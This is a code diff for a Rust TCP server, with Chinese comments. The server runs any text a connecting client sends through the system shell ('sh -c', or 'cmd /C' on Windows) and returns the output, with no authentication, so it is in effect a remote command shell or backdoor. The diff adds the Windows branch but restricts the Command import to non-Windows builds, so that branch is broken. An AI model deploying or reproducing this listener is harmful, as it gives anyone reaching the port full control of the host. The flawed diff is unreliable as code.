@@ -1,7 +1,8 @@
+#[cfg(not(target_os = "windows"))]
+use std::process::Command;
 
 use std::io::{self, Read, Write};
 use std::net::{TcpListener, TcpStream};
-use std::process::Command;
 use std::thread;
 use clap::{App, Arg};
 
@@ -17,16 +18,28 @@ fn handle_client(mut stream: TcpStream) -> io::Result<()> {
 
         // 执行客户端发送的命令，并将输出发送回客户端
         let command = String::from_utf8_lossy(&buffer[..bytes_read]);
-        let output = match Command::new("sh")
-            .arg("-c")
-            .arg(&command.to_string())
-            .output() {
-                Ok(output) => output,
-                Err(_) => continue, // 如果执行命令失败，则继续循环
-        };
-
-        // 将命令执行结果发送回客户端
-        stream.write_all(&output.stdout)?;
+        #[cfg(target_os = "windows")]
+        {
+            let output = match Command::new("cmd")
+                .arg("/C")
+                .arg(&command.to_string())
+                .output() {
+                    Ok(output) => output,
+                    Err(_) => continue, // 如果执行命令失败，则继续循环
+            };
+            stream.write_all(&output.stdout)?;
+        }
+        #[cfg(not(target_os = "windows"))]
+        {
+            let output = match Command::new("sh")
+                .arg("-c")
+                .arg(&command.to_string())
+                .output() {
+                    Ok(output) => output,
+                    Err(_) => continue, // 如果执行命令失败，则继续循环
+            };
+            stream.write_all(&output.stdout)?;
+        }
     }
 
     Ok(())
